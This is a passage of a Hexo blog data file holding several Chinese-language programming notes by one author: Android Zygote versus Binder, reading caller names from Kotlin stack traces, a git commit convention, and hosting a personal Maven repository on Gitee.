framework层学习笔记","date":"2022-08-31T16:00:00.000Z","author":"寒雨","hide":false,"_content":"\n# Android framework层学习笔记\n\n## 零碎的Q & A\n\n> 为什么SystemService(AMS)进程与Zygote进程通信不使用Binder而使用Socket?\n\n因为Zygote进程的fork操作仅允许在单线程下进行，而Binder之所以高性能的部分原因是因为它是多线程的。\n\n> 为什么Zygote只能在单线程下fork\n\n先来看看Zygote fork进程的工作原理\n\n> 1. 父进程的内存数据会原封不动的拷贝到子进程中（copy-on-write策略 -> 复制时内核并不复制整个进程的地址空间，而是让父子进程共享同一个地址空间。只用在需要写入的时候才会复制地址空间，从而使各个进行拥有各自的地址空间。也就是说，资源的复制是在需 要写入的时候才会进行，在此之前，只有以只读方式共享）\n> 2. **子进程在单线程状态下被生成**\n\n注意第二句话，也就是说被fork出来的进程只会带有一条线程，无论父进程有几条线程\n\n而上面我们说过了，Binder是基于多线程操作的。设想如果我们使用Binder来进行fork操作，会发生什么状况：\n\n> 如果一个Binder进程有锁，那么其拷贝的子进程上的主线程也会存在锁，子进程等待其子线程的资源来释放其拥有的锁，然而其父进程的子线程并不会拷贝过来，因为根据fork的工作，它的子进程只会被生成单线程，而这样一来就会造成死锁，为了解决这个问题fork就不允许存在多线程，所有Zygote也就不再使用Binder进程了。\n\n这里我有个疑问，如果是不存在锁的多线程呢？这里的解释是因为会导致死锁而不使用多线程，如果压根就没有使用锁呢？\n","source":"_posts/framework-study.md","raw":"---\ntitle: Android framework层学习笔记\ndate: 2022-09-01\nauthor: 寒雨\nhide: false\ncategories: 笔记\ntags:\n  - Android\n  - framework层\n---\n\n# Android framework层学习笔记\n\n## 零碎的Q & A\n\n> 为什么SystemService(AMS)进程与Zygote进程通信不使用Binder而使用Socket?\n\n因为Zygote进程的fork操作仅允许在单线程下进行，而Binder之所以高性能的部分原因是因为它是多线程的。\n\n> 为什么Zygote只能在单线程下fork\n\n先来看看Zygote fork进程的工作原理\n\n> 1. 父进程的内存数据会原封不动的拷贝到子进程中（copy-on-write策略 -> 复制时内核并不复制整个进程的地址空间，而是让父子进程共享同一个地址空间。只用在需要写入的时候才会复制地址空间，从而使各个进行拥有各自的地址空间。也就是说，资源的复制是在需 要写入的时候才会进行，在此之前，只有以只读方式共享）\n> 2. **子进程在单线程状态下被生成**\n\n注意第二句话，也就是说被fork出来的进程只会带有一条线程，无论父进程有几条线程\n\n而上面我们说过了，Binder是基于多线程操作的。设想如果我们使用Binder来进行fork操作，会发生什么状况：\n\n> 如果一个Binder进程有锁，那么其拷贝的子进程上的主线程也会存在锁，子进程等待其子线程的资源来释放其拥有的锁，然而其父进程的子线程并不会拷贝过来，因为根据fork的工作，它的子进程只会被生成单线程，而这样一来就会造成死锁，为了解决这个问题fork就不允许存在多线程，所有Zygote也就不再使用Binder进程了。\n\n这里我有个疑问，如果是不存在锁的多线程呢？这里的解释是因为会导致死锁而不使用多线程，如果压根就没有使用锁呢？\n","slug":"framework-study","published":1,"updated":"2022-11-24T03:02:12.163Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jta000nsfklbipc5s6n","content":"<h1 id=\"Android-framework层学习笔记\"><a href=\"#Android-framework层学习笔记\" class=\"headerlink\" title=\"Android framework层学习笔记\"></a>Android framework层学习笔记</h1><h2 id=\"零碎的Q-amp-A\"><a href=\"#零碎的Q-amp-A\" class=\"headerlink\" title=\"零碎的Q &amp; A\"></a>零碎的Q &amp; A</h2><blockquote>\n<p>为什么SystemService(AMS)进程与Zygote进程通信不使用Binder而使用Socket?</p>\n</blockquote>\n<p>因为Zygote进程的fork操作仅允许在单线程下进行，而Binder之所以高性能的部分原因是因为它是多线程的。</p>\n<blockquote>\n<p>为什么Zygote只能在单线程下fork</p>\n</blockquote>\n<p>先来看看Zygote fork进程的工作原理</p>\n<blockquote>\n<ol>\n<li>父进程的内存数据会原封不动的拷贝到子进程中（copy-on-write策略 -&gt; 复制时内核并不复制整个进程的地址空间，而是让父子进程共享同一个地址空间。只用在需要写入的时候才会复制地址空间，从而使各个进行拥有各自的地址空间。也就是说，资源的复制是在需 要写入的时候才会进行，在此之前，只有以只读方式共享）</li>\n<li><strong>子进程在单线程状态下被生成</strong></li>\n</ol>\n</blockquote>\n<p>注意第二句话，也就是说被fork出来的进程只会带有一条线程，无论父进程有几条线程</p>\n<p>而上面我们说过了，Binder是基于多线程操作的。设想如果我们使用Binder来进行fork操作，会发生什么状况：</p>\n<blockquote>\n<p>如果一个Binder进程有锁，那么其拷贝的子进程上的主线程也会存在锁，子进程等待其子线程的资源来释放其拥有的锁，然而其父进程的子线程并不会拷贝过来，因为根据fork的工作，它的子进程只会被生成单线程，而这样一来就会造成死锁，为了解决这个问题fork就不允许存在多线程，所有Zygote也就不再使用Binder进程了。</p>\n</blockquote>\n<p>这里我有个疑问，如果是不存在锁的多线程呢？这里的解释是因为会导致死锁而不使用多线程，如果压根就没有使用锁呢？</p>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}},"excerpt":"","more":"<h1 id=\"Android-framework层学习笔记\"><a href=\"#Android-framework层学习笔记\" class=\"headerlink\" title=\"Android framework层学习笔记\"></a>Android framework层学习笔记</h1><h2 id=\"零碎的Q-amp-A\"><a href=\"#零碎的Q-amp-A\" class=\"headerlink\" title=\"零碎的Q &amp; A\"></a>零碎的Q &amp; A</h2><blockquote>\n<p>为什么SystemService(AMS)进程与Zygote进程通信不使用Binder而使用Socket?</p>\n</blockquote>\n<p>因为Zygote进程的fork操作仅允许在单线程下进行，而Binder之所以高性能的部分原因是因为它是多线程的。</p>\n<blockquote>\n<p>为什么Zygote只能在单线程下fork</p>\n</blockquote>\n<p>先来看看Zygote fork进程的工作原理</p>\n<blockquote>\n<ol>\n<li>父进程的内存数据会原封不动的拷贝到子进程中（copy-on-write策略 -&gt; 复制时内核并不复制整个进程的地址空间，而是让父子进程共享同一个地址空间。只用在需要写入的时候才会复制地址空间，从而使各个进行拥有各自的地址空间。也就是说，资源的复制是在需 要写入的时候才会进行，在此之前，只有以只读方式共享）</li>\n<li><strong>子进程在单线程状态下被生成</strong></li>\n</ol>\n</blockquote>\n<p>注意第二句话，也就是说被fork出来的进程只会带有一条线程，无论父进程有几条线程</p>\n<p>而上面我们说过了，Binder是基于多线程操作的。设想如果我们使用Binder来进行fork操作，会发生什么状况：</p>\n<blockquote>\n<p>如果一个Binder进程有锁，那么其拷贝的子进程上的主线程也会存在锁，子进程等待其子线程的资源来释放其拥有的锁，然而其父进程的子线程并不会拷贝过来，因为根据fork的工作，它的子进程只会被生成单线程，而这样一来就会造成死锁，为了解决这个问题fork就不允许存在多线程，所有Zygote也就不再使用Binder进程了。</p>\n</blockquote>\n<p>这里我有个疑问，如果是不存在锁的多线程呢？这里的解释是因为会导致死锁而不使用多线程，如果压根就没有使用锁呢？</p>\n"},{"title":"java/kotlin 方法中获得调用方的类与方法名","date":"2021-11-03T09:10:42.000Z","author":"寒雨","hide":false,"summary":"整理了java/kotlin 方法中获得调用方的类与方法名的方式","_content":"\n这也是我一直很感兴趣的一个问题。曾经在翻阅TabooLib5源码时发现过类似的功能，TabooLib5利用它来得到调用方法的插件实例。\n\n今天在网上冲浪的时候搞明白了，便来写一篇博文。\n\n## 从栈中获取\n\n在方法调用中new一个Throwable实例，得到它的stackTrace（stackTraceElement数组），便可以提取出一条完整的方法调用链。\n\n同理，在try catch抓报错的时候，抓到的报错也可以通过获取stackTrace来提取一条方法调用链。\n\n在写一个Exception的时候，你甚至可以重写它的printStackTrace方法让它的报错更好看 （\n\n**例子**\n\nParctice.kt\n\n```kotlin\npackage kim.bifrost.coldrain.partice\n\n/**\n * kim.bifrost.coldrain.partice.Partice\n * Partice\n *\n * @author 寒雨\n * @since 2021/11/3 16:45\n **/\nfun main() {\n    test()\n}\n\nfun test() {\n    // 获取上一级调用者\n    val info = Throwable().stackTrace.run {\n        get(size - 2)\n    }\n    println(\"class: ${info.className} method: ${info.methodName}\")\n}\n```\n\n编译后运行结果为\n\n```\nclass: kim.bifrost.coldrain.partice.ParticeKt method: main\n```\n\n### 获取其他线程的栈\n\n调用Thread#getStackTrace()\n\n该方法不建议在当前线程调用，Throwable#getStackTrace()优于该方法\n\n理由见Log4j注释[https://github.com/apache/loggin ... l/StackLocator.java](https://github.com/apache/logging-log4j2/blob/20f9a97dbe5928c3b5077bcdd2a22ac92e941655/log4j-api/src/main/java/org/apache/logging/log4j/util/StackLocator.java)\n\n## JDK8后弃用的Reflection.getCallerClass方法\n\nsun.reflect.Reflection.getCallerClass()\n\n但不建议使用，JDK8以后该内部api已经被删除","source":"_posts/get-stacktrace-method-path.md","raw":"---\ntitle: java/kotlin 方法中获得调用方的类与方法名\ndate: 2021-11-3 17:10:42\nauthor: 寒雨\nhide: false\nsummary: 整理了java/kotlin 方法中获得调用方的类与方法名的方式\ncategories: 笔记\ntags:\n  - Java\n  - Kotlin\n---\n\n这也是我一直很感兴趣的一个问题。曾经在翻阅TabooLib5源码时发现过类似的功能，TabooLib5利用它来得到调用方法的插件实例。\n\n今天在网上冲浪的时候搞明白了，便来写一篇博文。\n\n## 从栈中获取\n\n在方法调用中new一个Throwable实例，得到它的stackTrace（stackTraceElement数组），便可以提取出一条完整的方法调用链。\n\n同理，在try catch抓报错的时候，抓到的报错也可以通过获取stackTrace来提取一条方法调用链。\n\n在写一个Exception的时候，你甚至可以重写它的printStackTrace方法让它的报错更好看 （\n\n**例子**\n\nParctice.kt\n\n```kotlin\npackage kim.bifrost.coldrain.partice\n\n/**\n * kim.bifrost.coldrain.partice.Partice\n * Partice\n *\n * @author 寒雨\n * @since 2021/11/3 16:45\n **/\nfun main() {\n    test()\n}\n\nfun test() {\n    // 获取上一级调用者\n    val info = Throwable().stackTrace.run {\n        get(size - 2)\n    }\n    println(\"class: ${info.className} method: ${info.methodName}\")\n}\n```\n\n编译后运行结果为\n\n```\nclass: kim.bifrost.coldrain.partice.ParticeKt method: main\n```\n\n### 获取其他线程的栈\n\n调用Thread#getStackTrace()\n\n该方法不建议在当前线程调用，Throwable#getStackTrace()优于该方法\n\n理由见Log4j注释[https://github.com/apache/loggin ... l/StackLocator.java](https://github.com/apache/logging-log4j2/blob/20f9a97dbe5928c3b5077bcdd2a22ac92e941655/log4j-api/src/main/java/org/apache/logging/log4j/util/StackLocator.java)\n\n## JDK8后弃用的Reflection.getCallerClass方法\n\nsun.reflect.Reflection.getCallerClass()\n\n但不建议使用，JDK8以后该内部api已经被删除","slug":"get-stacktrace-method-path","published":1,"updated":"2022-12-12T15:49:35.550Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jtd000rsfkl1xt22b85","content":"<p>这也是我一直很感兴趣的一个问题。曾经在翻阅TabooLib5源码时发现过类似的功能，TabooLib5利用它来得到调用方法的插件实例。</p>\n<p>今天在网上冲浪的时候搞明白了，便来写一篇博文。</p>\n<h2 id=\"从栈中获取\"><a href=\"#从栈中获取\" class=\"headerlink\" title=\"从栈中获取\"></a>从栈中获取</h2><p>在方法调用中new一个Throwable实例，得到它的stackTrace（stackTraceElement数组），便可以提取出一条完整的方法调用链。</p>\n<p>同理，在try catch抓报错的时候，抓到的报错也可以通过获取stackTrace来提取一条方法调用链。</p>\n<p>在写一个Exception的时候，你甚至可以重写它的printStackTrace方法让它的报错更好看 （</p>\n<p><strong>例子</strong></p>\n<p>Parctice.kt</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">package</span> kim<span class=\"token punctuation\">.</span>bifrost<span class=\"token punctuation\">.</span>coldrain<span class=\"token punctuation\">.</span>partice\n\n<span class=\"token comment\">/**\n * kim.bifrost.coldrain.partice.Partice\n * Partice\n *\n * @author 寒雨\n * @since 2021/11/3 16:45\n **/</span>\n<span class=\"token keyword\">fun</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// 获取上一级调用者</span>\n    <span class=\"token keyword\">val</span> info <span class=\"token operator\">=</span> <span class=\"token function\">Throwable</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>stackTrace<span class=\"token punctuation\">.</span><span class=\"token function\">run</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">get</span><span class=\"token punctuation\">(</span>size <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"class: <span class=\"token interpolation\"><span class=\"token delimiter variable\">${</span>info<span class=\"token punctuation\">.</span>className<span class=\"token delimiter variable\">}</span></span> method: <span class=\"token interpolation\"><span class=\"token delimiter variable\">${</span>info<span class=\"token punctuation\">.</span>methodName<span class=\"token delimiter variable\">}</span></span>\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>编译后运行结果为</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">class: kim.bifrost.coldrain.partice.ParticeKt method: main<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"获取其他线程的栈\"><a href=\"#获取其他线程的栈\" class=\"headerlink\" title=\"获取其他线程的栈\"></a>获取其他线程的栈</h3><p>调用Thread#getStackTrace()</p>\n<p>该方法不建议在当前线程调用，Throwable#getStackTrace()优于该方法</p>\n<p>理由见Log4j注释<a href=\"https://github.com/apache/logging-log4j2/blob/20f9a97dbe5928c3b5077bcdd2a22ac92e941655/log4j-api/src/main/java/org/apache/logging/log4j/util/StackLocator.java\">https://github.com/apache/loggin ... l/StackLocator.java</a></p>\n<h2 id=\"JDK8后弃用的Reflection-getCallerClass方法\"><a href=\"#JDK8后弃用的Reflection-getCallerClass方法\" class=\"headerlink\" title=\"JDK8后弃用的Reflection.getCallerClass方法\"></a>JDK8后弃用的Reflection.getCallerClass方法</h2><p>sun.reflect.Reflection.getCallerClass()</p>\n<p>但不建议使用，JDK8以后该内部api已经被删除</p>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}},"excerpt":"","more":"<p>这也是我一直很感兴趣的一个问题。曾经在翻阅TabooLib5源码时发现过类似的功能，TabooLib5利用它来得到调用方法的插件实例。</p>\n<p>今天在网上冲浪的时候搞明白了，便来写一篇博文。</p>\n<h2 id=\"从栈中获取\"><a href=\"#从栈中获取\" class=\"headerlink\" title=\"从栈中获取\"></a>从栈中获取</h2><p>在方法调用中new一个Throwable实例，得到它的stackTrace（stackTraceElement数组），便可以提取出一条完整的方法调用链。</p>\n<p>同理，在try catch抓报错的时候，抓到的报错也可以通过获取stackTrace来提取一条方法调用链。</p>\n<p>在写一个Exception的时候，你甚至可以重写它的printStackTrace方法让它的报错更好看 （</p>\n<p><strong>例子</strong></p>\n<p>Parctice.kt</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">package</span> kim<span class=\"token punctuation\">.</span>bifrost<span class=\"token punctuation\">.</span>coldrain<span class=\"token punctuation\">.</span>partice\n\n<span class=\"token comment\">/**\n * kim.bifrost.coldrain.partice.Partice\n * Partice\n *\n * @author 寒雨\n * @since 2021/11/3 16:45\n **/</span>\n<span class=\"token keyword\">fun</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">// 获取上一级调用者</span>\n    <span class=\"token keyword\">val</span> info <span class=\"token operator\">=</span> <span class=\"token function\">Throwable</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>stackTrace<span class=\"token punctuation\">.</span><span class=\"token function\">run</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">get</span><span class=\"token punctuation\">(</span>size <span class=\"token operator\">-</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"class: <span class=\"token interpolation\"><span class=\"token delimiter variable\">$&#123;</span>info<span class=\"token punctuation\">.</span>className<span class=\"token delimiter variable\">&#125;</span></span> method: <span class=\"token interpolation\"><span class=\"token delimiter variable\">$&#123;</span>info<span class=\"token punctuation\">.</span>methodName<span class=\"token delimiter variable\">&#125;</span></span>\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>编译后运行结果为</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">class: kim.bifrost.coldrain.partice.ParticeKt method: main<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"获取其他线程的栈\"><a href=\"#获取其他线程的栈\" class=\"headerlink\" title=\"获取其他线程的栈\"></a>获取其他线程的栈</h3><p>调用Thread#getStackTrace()</p>\n<p>该方法不建议在当前线程调用，Throwable#getStackTrace()优于该方法</p>\n<p>理由见Log4j注释<a href=\"https://github.com/apache/logging-log4j2/blob/20f9a97dbe5928c3b5077bcdd2a22ac92e941655/log4j-api/src/main/java/org/apache/logging/log4j/util/StackLocator.java\">https://github.com/apache/loggin ... l/StackLocator.java</a></p>\n<h2 id=\"JDK8后弃用的Reflection-getCallerClass方法\"><a href=\"#JDK8后弃用的Reflection-getCallerClass方法\" class=\"headerlink\" title=\"JDK8后弃用的Reflection.getCallerClass方法\"></a>JDK8后弃用的Reflection.getCallerClass方法</h2><p>sun.reflect.Reflection.getCallerClass()</p>\n<p>但不建议使用，JDK8以后该内部api已经被删除</p>\n"},{"title":"Git Commit 规范","date":"2021-10-28T07:14:52.000Z","author":"寒雨","hide":false,"summary":"git commit规范","_content":"\n# Commit 规范\n\ncopy的学长的git教程。\n\n以前都没怎么注意commit这方面的规范，以后要多加注意\n\n> 描述写法如下：\n>\n> ```\n> [type]title\n> describtion\n> ```\n>\n> type如下：\n>\n> - fix -------------> bug 修护\n> - feature -------> 需求\n> - optimize ------> 优化\n> - release --------> 版本升级\n> - style ------------> 代码格式调整，不涉及代码更改\n>\n> title：需求标题（对于该commit的简单描述）\n>\n> describtion：需求的具体描述（如果过于简单的提交可以不用写该部分）\n>\n> 若提交消息有说明遗漏，可以通过 [Amend](#Amend 按钮) 进行补救","source":"_posts/git-commit-rule.md","raw":"---\ntitle: Git Commit 规范\ndate: 2021-10-28 15:14:52\nauthor: 寒雨\nhide: false\nsummary: git commit规范\ncategories: 笔记\ntags:\n  - git\n---\n\n# Commit 规范\n\ncopy的学长的git教程。\n\n以前都没怎么注意commit这方面的规范，以后要多加注意\n\n> 描述写法如下：\n>\n> ```\n> [type]title\n> describtion\n> ```\n>\n> type如下：\n>\n> - fix -------------> bug 修护\n> - feature -------> 需求\n> - optimize ------> 优化\n> - release --------> 版本升级\n> - style ------------> 代码格式调整，不涉及代码更改\n>\n> title：需求标题（对于该commit的简单描述）\n>\n> describtion：需求的具体描述（如果过于简单的提交可以不用写该部分）\n>\n> 若提交消息有说明遗漏，可以通过 [Amend](#Amend 按钮) 进行补救","slug":"git-commit-rule","published":1,"updated":"2021-11-13T16:17:01.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jtd000usfkl4cld3upt","content":"<h1 id=\"Commit-规范\"><a href=\"#Commit-规范\" class=\"headerlink\" title=\"Commit 规范\"></a>Commit 规范</h1><p>copy的学长的git教程。</p>\n<p>以前都没怎么注意commit这方面的规范，以后要多加注意</p>\n<blockquote>\n<p>描述写法如下：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">[type]title\ndescribtion<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>type如下：</p>\n<ul>\n<li>fix ————-&gt; bug 修护</li>\n<li>feature ——-&gt; 需求</li>\n<li>optimize ——&gt; 优化</li>\n<li>release ——–&gt; 版本升级</li>\n<li>style ————&gt; 代码格式调整，不涉及代码更改</li>\n</ul>\n<p>title：需求标题（对于该commit的简单描述）</p>\n<p>describtion：需求的具体描述（如果过于简单的提交可以不用写该部分）</p>\n<p>若提交消息有说明遗漏，可以通过 [Amend](#Amend 按钮) 进行补救</p>\n</blockquote>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}},"excerpt":"","more":"<h1 id=\"Commit-规范\"><a href=\"#Commit-规范\" class=\"headerlink\" title=\"Commit 规范\"></a>Commit 规范</h1><p>copy的学长的git教程。</p>\n<p>以前都没怎么注意commit这方面的规范，以后要多加注意</p>\n<blockquote>\n<p>描述写法如下：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">[type]title\ndescribtion<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>type如下：</p>\n<ul>\n<li>fix ————-&gt; bug 修护</li>\n<li>feature ——-&gt; 需求</li>\n<li>optimize ——&gt; 优化</li>\n<li>release ——–&gt; 版本升级</li>\n<li>style ————&gt; 代码格式调整，不涉及代码更改</li>\n</ul>\n<p>title：需求标题（对于该commit的简单描述）</p>\n<p>describtion：需求的具体描述（如果过于简单的提交可以不用写该部分）</p>\n<p>若提交消息有说明遗漏，可以通过 [Amend](#Amend 按钮) 进行补救</p>\n</blockquote>\n"},{"title":"利用Gitee搭建了自己的Maven仓库","date":"2021-09-05T16:00:21.000Z","author":"寒雨","hide":false,"summary":"使用gitee搭建了一个自用maven仓库","_content":"\n鼓捣了一晚上终于弄出来了......\n\n[maven: 寒雨的maven仓库 (gitee.com)](https://gitee.com/coldrain-moro/maven)\n\n也算是给自己当初偷懒没去多多了解maven补上了一课，出来混，迟早要还的\n\n之所以选择gitee而没有选择github当然是因为速度快\n\n## Note\n\n### 上传jar到仓库的命令\n\n像这样写上传了Tiphareth到本地maven仓库里\n\n```\nmvn install:install-file -Dfile=E:\\ColdRain_Moro\\项目\\Tiphareth\\build\\libs\\Tiphareth-1.4.0.jar -DgroupId=ink.ptms.tiphareth -DartifactId=tiphareth -Dversion=1.4.0 -Dpackaging=Jar\n```\n\n### 改变默认maven仓库路径\n\n在 settings.xml 中下文标记位置添加如下内容\n\n```xml\n<settings xmlns=\"http://maven.apache.org/SETTINGS/1.2.0\"\n          xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n          xsi:schemaLocation=\"http://maven.apache.org/SETTINGS/1.2.0 https://maven.apache.org/xsd/settings-1.2.0.xsd\">\n  <!-- localRepository\n   | The path to the local repository maven will use to store artifacts.\n   |\n   | Default: ${user.home}/.m2/repository\n  <localRepository>/path/to/local/repo</localRepository>\n\t下面是要添加的内容\n  -->\n  <localRepository>E:\\ColdRain_Moro\\项目\\maven\\repo</localRepository>\n```\n\n### 如何使用\n\n我一般只用gradle，所以这里只标记gradle的使用方式\n\n***gradle yyds***\n\n```\nrepositories {\n    mavenCentral()\n    // 添加我的仓库\n    maven { url = uri(\"https://gitee.com/coldrain-moro/maven/raw/master/repo\") }\n}\n\ndependencies {\n\t// 导入仓库里的依赖tiphareth\n    compileOnly(\"ink.ptms.tiphareth:tiphareth:1.4.0\")\n    compileOnly(\"public:PlaceholderAPI:2.10.9@jar\")\n    compileOnly(\"ink.ptms.core:v11605:11605\")\n    compileOnly(kotlin(\"stdlib\"))\n    compileOnly(fileTree(\"libs\"))\n}\n```\n\n","source":"_posts/gitee-maven.md","raw":"---\ntitle: 利用Gitee搭建了自己的Maven仓库\ndate: 2021-09-06 00:00:21\nauthor: 寒雨\nhide: false\nsummary: 使用gitee搭建了一个自用maven仓库\ncategories: 笔记\ntags:\n  - maven\n---\n\n鼓捣了一晚上终于弄出来了......\n\n[maven: 寒雨的maven仓库 (gitee.com)](https://gitee.com/coldrain-moro/maven)\n\n也算是给自己当初偷懒没去多多了解maven补上了一课，出来混，迟早要还的\n\n之所以选择gitee而没有选择github当然是因为速度快\n\n## Note\n\n### 上传jar到仓库的命令\n\n像这样写上传了Tiphareth到本地maven仓库里\n\n```\nmvn install:install-file -Dfile=E:\\ColdRain_Moro\\项目\\Tiphareth\\build\\libs\\Tiphareth-1.4.0.jar -DgroupId=ink.ptms.tiphareth -DartifactId=tiphareth -Dversion=1.4.0 -Dpackaging=Jar\n```\n\n### 改变默认maven仓库路径\n\n在 settings.xml 中下文标记位置添加如下内容\n\n```xml\n<settings xmlns=\"http://maven.apache.org/SETTINGS/1.2.0\"\n          xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n          xsi:schemaLocation=\"http://maven.apache.org/SETTINGS/1.2.0 https://maven.apache.org/xsd/settings-1.2.0.xsd\">\n  <!-- localRepository\n   | The path to the local repository maven will use to store artifacts.\n   |\n   | Default: ${user.home}/.m2/repository\n  <localRepository>/path/to/local/repo</localRepository>\n\t下面是要添加的内容\n  -->\n  <localRepository>E:\\ColdRain_Moro\\项目\\maven\\repo</localRepository>\n```\n\n### 如何使用\n\n我一般只用gradle，所以这里只标记gradle的使用方式\n\n***gradle yyds***\n\n```\nrepositories {\n    mavenCentral()\n    // 添加我的仓库\n    maven { url = uri(\"https://gitee.com/coldrain-moro/maven/raw/master/repo\") }\n}\n\ndependencies {\n\t// 导入仓库里的依赖tiphareth\n    compileOnly(\"ink.ptms.tiphareth:tiphareth:1.4.0\")\n    compileOnly(\"public:PlaceholderAPI:2.10.9@jar\")\n    compileOnly(\"ink.ptms.core:v11605:11605\")\n    compileOnly(kotlin(\"stdlib\"))\n    compileOnly(fileTree(\"libs\"))\n}\n```\n\n","slug":"gitee-maven","published":1,"updated":"2021-11-13T16:17:05.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jtf000ysfklcmlh04lk","content":"<p>鼓捣了一晚上终于弄出来了……</p>\n<p><a href=\"https://gitee.com/coldrain-moro/maven\">maven: 寒雨的maven仓库 (gitee.com)</a></p>\n<p>也算是给自己当初偷懒没去多多了解maven补上了一课，出来混，迟早要还的</p>\n<p>之所以选择gitee而没有选择github当然是因为速度快</p>\n<h2 id=\"Note\"><a href=\"#Note\" class=\"headerlink\" title=\"Note\"></a>Note</h2><h3 id=\"上传jar到仓库的命令\"><a href=\"#上传jar到仓库的命令\" class=\"headerlink\" title=\"上传jar到仓库的命令\"></a>上传jar到仓库的命令</h3><p>像这样写上传了Tiphareth到本地maven仓库里</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">mvn install:install-file -Dfile=E:\\ColdRain_Moro\\项目\\Tiphareth\\build\\libs\\Tiphareth-1.4.0.jar -DgroupId=ink.ptms.tiphareth -DartifactId=tiphareth -Dversion=1.4.0 -Dpackaging=Jar<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"改变默认maven仓库路径\"><a href=\"#改变默认maven仓库路径\" class=\"headerlink\" title=\"改变默认maven仓库路径\"></a>改变默认maven仓库路径</h3><p>在 settings.xml 中下文标记位置添加如下内容</p>\n<pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>settings</span> <span class=\"token attr-name\">xmlns</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://maven.apache.org/SETTINGS/1.2.0<span class=\"token punctuation\">\"</span></span>\n          <span class=\"token attr-name\"><span class=\"token namespace\">xmlns:</span>xsi</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://www.w3.org/2001/XMLSchema-instance<span class=\"token punctuation\">\"</span></span>\n          <span class=\"token attr-name\"><span class=\"token namespace\">xsi:</span>schemaLocation</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token 